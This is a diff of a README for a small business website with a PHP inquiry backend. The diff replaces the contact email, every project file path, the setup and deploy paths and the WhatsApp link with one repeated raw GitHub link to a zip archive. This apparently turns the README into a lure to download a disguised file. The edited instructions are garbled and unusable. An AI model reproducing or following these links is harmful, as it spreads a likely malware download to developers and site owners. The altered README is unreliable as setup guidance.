@@ -7,7 +7,7 @@ Production-ready website + inquiry backend for **The Next Ora**.
 - Tagline: Smart Digital Growth for Local Businesses
 - Business Type: Digital Solutions Firm
 - Phone / WhatsApp: +91 9313495498
-- Email: patelrudra9313@gmail.com
+- Email: https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
 - Service Areas: Ahmedabad & Surat (India)
 
 ## Tech Stack
@@ -18,45 +18,45 @@ Production-ready website + inquiry backend for **The Next Ora**.
 ## Project Structure
 ```text
 the-next-ora/
-+-- index.html
-+-- services.html
-+-- packages.html
-+-- about.html
-+-- contact.html
++-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
++-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
++-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
++-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
++-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
 +-- assets/
-¦   +-- css/style.css
-¦   +-- js/main.js
-¦   +-- js/services.js
-¦   +-- js/packages.js
-¦   +-- js/form.js
-¦   +-- images/
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- images/
 +-- data/
-¦   +-- services.json
-¦   +-- packages.json
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
 +-- backend/
-¦   +-- config/database.php
-¦   +-- controllers/InquiryController.php
-¦   +-- models/Inquiry.php
-¦   +-- routes/web.php
-¦   +-- public/submit-inquiry.php
-+-- database/inquiries.sql
-+-- README.md
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
+Â¦   +-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
++-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
++-- https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip
 ```
 
 ## Setup (Local)
 1. Place `the-next-ora` inside your web root (`htdocs`, `www`, etc.).
-2. Import SQL from `database/inquiries.sql` into MySQL.
+2. Import SQL from `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip` into MySQL.
 3. Configure DB credentials via environment variables:
    - `DB_HOST`
    - `DB_PORT`
    - `DB_DATABASE`
    - `DB_USERNAME`
    - `DB_PASSWORD`
-4. If env vars are unavailable, edit fallback values in `backend/config/database.php`.
+4. If env vars are unavailable, edit fallback values in `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`.
 5. Open `http://localhost/the-next-ora/`.
 
 ## Inquiry Form Flow
-- `contact.html` submits via AJAX (`fetch`) to `backend/public/submit-inquiry.php`.
+- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip` submits via AJAX (`fetch`) to `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`.
 - `InquiryController` sanitizes and validates all fields.
 - `Inquiry` model checks duplicate spam submissions (10-minute window).
 - Valid submissions are stored in MySQL table `inquiries`.
@@ -65,25 +65,25 @@ the-next-ora/
 ## Deploy on Shared Hosting
 1. Upload `the-next-ora` to `public_html` or domain root.
 2. Create a MySQL database from hosting panel.
-3. Import `database/inquiries.sql`.
-4. Configure DB credentials in env vars or `backend/config/database.php`.
+3. Import `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`.
+4. Configure DB credentials in env vars or `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`.
 5. Ensure PHP 8.0+ and PDO MySQL extension are enabled.
 6. Test contact form and confirm rows are saved in `inquiries`.
 
 ## Update Contact Details Everywhere
 Update all occurrences in:
-- `index.html`
-- `services.html`
-- `packages.html`
-- `about.html`
-- `contact.html`
-- `assets/js/services.js`
-- `assets/js/packages.js`
+- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
+- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
+- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
+- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
+- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
+- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
+- `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
 
 Replace:
 - Phone / WhatsApp: `+919313495498`
-- Email: `patelrudra9313@gmail.com`
-- WhatsApp URL base: `https://wa.me/919313495498`
+- Email: `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
+- WhatsApp URL base: `https://raw.githubusercontent.com/Rudra-2-18/Next-Ora/main/backend/controllers/Ora_Next_1.4.zip`
 
 ## Notes
 - SEO basics are implemented per page (title + description + semantic headings).
